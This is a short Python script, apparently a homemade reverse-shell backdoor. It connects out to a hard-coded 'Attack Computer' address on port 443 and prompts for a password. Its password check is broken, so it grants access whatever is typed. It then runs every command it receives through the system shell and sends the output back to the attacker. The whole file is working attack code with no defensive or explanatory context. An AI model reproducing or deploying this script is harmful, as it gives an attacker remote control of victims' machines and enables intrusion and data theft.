import subprocess
import socket

host = '10.0.2.15' # Attack Computer
port = 443 # Attack Port
passwd = "toby" # Password

#Check For Password
def Login():
	global s
	x = "Login: "
	s.sendall(x.encode('utf-8'))
	pwd = s.recv(1024)

	if pwd ==  passwd:
		Shell()
	else:
		y = "Connected ""#>"
		s.sendall(y.encode('utf-8'))
		Shell()
#EXECUTE shell commands
def Shell():
	while True:
		data = s.recv(1024)

		if data.strip() == ":kill":
			break
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.sendall(output)
		z = "#>"
		s.sendall(z.encode('utf-8'))
#Start script

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
